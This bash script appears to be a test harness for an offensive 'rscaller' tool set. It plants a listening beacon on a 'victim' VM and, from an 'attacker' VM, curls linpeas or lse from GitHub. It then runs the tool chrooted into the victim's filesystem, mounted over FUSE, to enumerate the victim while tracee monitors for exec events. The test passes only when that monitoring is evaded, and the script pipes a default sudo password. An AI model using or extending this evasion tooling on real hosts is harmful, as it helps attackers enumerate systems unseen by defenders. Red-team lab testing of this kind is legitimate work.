#!/usr/bin/env bash
# test_evasion_baseline.sh — baseline evasion detection test
#
# Topology (rscaller model):
#   CLONE = victim  — runs rsbeacon (serves its own FS) + tracee (watches execs)
#   REMOTE = attacker — uses `rsc` wrapper which auto-mounts rscfuse at /rsc/default/,
#                       then chroots enum tool into that mount
#
# The enum tool runs on REMOTE, reads victim's FS through rscfuse (FUSE), never
# executes anything on CLONE. Tracee on CLONE should see near-zero exec events.
#
# Pass/fail: tracee on CLONE must see <= MAX_EXEC_EVENTS exec events.
#
# Usage:
#   bash scripts/test_evasion_baseline.sh [remote] [clone]
#   TOOL=linpeas EXEC_TIMEOUT=120 MAX_EXEC_EVENTS=2 bash scripts/test_evasion_baseline.sh
#
# Dependencies:
#   REMOTE (attacker): fuse3, rsc + rscfuse binaries (target/release/)
#   CLONE  (victim):   tracee (/tmp/tracee or in PATH), rsbeacon binary

set -euo pipefail

REMOTE="${1:-${REMOTE:-dev-vm-rscaller}}"
CLONE="${2:-${CLONE:-dev-vm-rscaller-clone}}"
BECOME_PASS="${BECOME_PASS:-ubuntu}"
TOOL="${TOOL:-lse}"
EXEC_TIMEOUT="${EXEC_TIMEOUT:-90}"
MAX_EXEC_EVENTS="${MAX_EXEC_EVENTS:-2}"   # near-zero = evasion working
BEACON_PORT="${BEACON_PORT:-9999}"
REMOTE_DIR="${REMOTE_DIR:-/home/ubuntu/rscaller}"
RSC_MOUNT="${RSC_MOUNT:-/rsc/default}"    # rsc mounts rscfuse here automatically
TRACEE_LOG="${TRACEE_LOG:-/tmp/rscaller-tracee-baseline.log}"
TOOL_LOG="/tmp/rscaller-tool-baseline.log"
LOCAL_EVENTS="/tmp/rscaller-tracee-events.log"

SUDO="echo $(printf '%q' "$BECOME_PASS") | sudo -S"

if [[ -f "$(dirname "${BASH_SOURCE[0]}")/../.env" ]]; then
  set -o allexport; source "$(dirname "${BASH_SOURCE[0]}")/../.env"; set +o allexport
fi

echo "=== evasion baseline test ==="
echo "  remote (attacker) : $REMOTE  — rsc + chroot enum via rscfuse"
echo "  clone  (victim)   : $CLONE   — rsbeacon + tracee"
echo "  tool              : $TOOL (timeout ${EXEC_TIMEOUT}s)"
echo "  rsc mount         : $RSC_MOUNT"
echo "  pass if           : tracee on victim sees <= $MAX_EXEC_EVENTS exec events"
echo ""

CLONE_IP="$(ssh "$CLONE" 'hostname -I 2>/dev/null' | awk '{print $1}')"
echo "[setup] victim IP: $CLONE_IP"

# ── 1. Start rsbeacon on victim ───────────────────────────────────────────────
echo "[1/5] Starting rsbeacon on $CLONE ($CLONE_IP:$BEACON_PORT)..."
ssh "$CLONE" "
  pkill rsbeacon 2>/dev/null || true
  sleep 0.3
  nohup '${REMOTE_DIR}/target/release/rsbeacon' --listen '0.0.0.0:${BEACON_PORT}' \
    > /tmp/rsbeacon-evasion.log 2>&1 &
  sleep 0.5
  pgrep rsbeacon > /dev/null && echo '  rsbeacon: running' \
    || { echo 'rsbeacon failed to start'; exit 1; }
"

# ── 2. Ensure tracee on victim ────────────────────────────────────────────────
echo "[2/5] Checking tracee on $CLONE..."
ssh "$CLONE" bash << 'SETUP'
set -euo pipefail
if command -v tracee &>/dev/null || test -f /tmp/tracee; then
  echo "  tracee: found"
  exit 0
fi
echo "  tracee: not found — install manually: place tracee binary at /tmp/tracee"
exit 1
SETUP

# ── 3. Start tracee on victim ─────────────────────────────────────────────────
echo "[3/5] Starting tracee on $CLONE (exec events)..."
ssh "$CLONE" "rm -f '${TRACEE_LOG}' /tmp/tracee-evasion.pid"
ssh "$CLONE" "
  TBIN=\$(command -v tracee 2>/dev/null || echo /tmp/tracee)
  $SUDO \"\$TBIN\" \
    --output format:table \
    --output option:parse-arguments \
    --trace event=execve,execveat \
    > '${TRACEE_LOG}' 2>&1 &
  echo \$! > /tmp/tracee-evasion.pid
  sleep 1
  pgrep -F /tmp/tracee-evasion.pid > /dev/null \
    && echo '  tracee: running (PID '\$(cat /tmp/tracee-evasion.pid)')' \
    || { echo 'tracee failed to start'; cat '${TRACEE_LOG}'; exit 1; }
" &
TRACEE_SSH_PID=$!
sleep 2  # let tracee initialize

# ── 4. Fetch tool + run via rsc chrooted into rscfuse mount ──────────────────
echo "[4/5] Running $TOOL on $REMOTE via rsc (chrooted into $RSC_MOUNT)..."

case "$TOOL" in
  lse|lse.sh)
    TOOL_URL="https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh"
    TOOL_FILE="/tmp/lse.sh"
    TOOL_CMD="bash /tmp/lse.sh -l 1 -i"
    ;;
  linpeas)
    TOOL_URL="https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh"
    TOOL_FILE="/tmp/linpeas.sh"
    TOOL_CMD="bash /tmp/linpeas.sh -q"
    ;;
  *)
    echo "Unknown TOOL=$TOOL. Use lse or linpeas." >&2; exit 1 ;;
esac

ssh "$REMOTE" "bash -s" << REMOTE_RUN
set -euo pipefail

# Fetch tool locally
curl -fsSL '${TOOL_URL}' -o '${TOOL_FILE}'
chmod +x '${TOOL_FILE}'

# Copy tool into rscfuse mount (victim's /tmp) after rsc brings it up.
# rsc auto-mounts rscfuse at ${RSC_MOUNT} before exec'ing the command.
# We run a wrapper: copy tool → chroot → run tool.
echo "  launching rsc → rscfuse mount → chroot → ${TOOL}..."
$SUDO timeout $((${EXEC_TIMEOUT} + 10)) \
  '${REMOTE_DIR}/target/release/rsc' \
    --beacon '${CLONE_IP}:${BEACON_PORT}' \
    --rscfuse '${REMOTE_DIR}/target/release/rscfuse' \
    -- bash -c "
      cp '${TOOL_FILE}' '${RSC_MOUNT}/tmp/'
      timeout ${EXEC_TIMEOUT} chroot '${RSC_MOUNT}' ${TOOL_CMD}
    " > '${TOOL_LOG}' 2>&1 && TOOL_EC=0 || TOOL_EC=\$?

if [[ \$TOOL_EC -eq 124 ]]; then
  echo "  ${TOOL}: timed out after ${EXEC_TIMEOUT}s (expected)"
elif [[ \$TOOL_EC -ne 0 ]]; then
  echo "  ${TOOL}: exited with code \$TOOL_EC"
  tail -20 '${TOOL_LOG}' >&2
else
  echo "  ${TOOL}: done"
fi
REMOTE_RUN

# ── Stop tracee on victim ─────────────────────────────────────────────────────
sleep 1
ssh "$CLONE" "
  if test -f /tmp/tracee-evasion.pid; then
    $SUDO kill \$(cat /tmp/tracee-evasion.pid) 2>/dev/null || true
    rm -f /tmp/tracee-evasion.pid
    echo '  tracee: stopped'
  fi
"
wait "$TRACEE_SSH_PID" 2>/dev/null || true

# ── 5. Collect and evaluate results ──────────────────────────────────────────
echo ""
echo "[5/5] Exec events captured by tracee on $CLONE (victim):"
echo "--------------------------------------------------------------"
ssh "$CLONE" "grep -i execve '${TRACEE_LOG}' 2>/dev/null || echo '  (no events)'" \
  | tee "$LOCAL_EVENTS"
echo "--------------------------------------------------------------"

EVENT_COUNT=$(grep -vc '(no events)' "$LOCAL_EVENTS" 2>/dev/null || echo 0)
echo ""
echo "  exec events on victim : $EVENT_COUNT"
echo "  maximum allowed       : $MAX_EXEC_EVENTS  (0 = perfect evasion)"
echo ""

if [[ "$EVENT_COUNT" -le "$MAX_EXEC_EVENTS" ]]; then
  echo "PASS — evasion working: victim saw only $EVENT_COUNT exec events during $TOOL run"
  exit 0
else
  echo "FAIL — $EVENT_COUNT exec events visible on victim (expected <= $MAX_EXEC_EVENTS)"
  echo "       Tool activity is leaking through to the victim."
  exit 1
fi
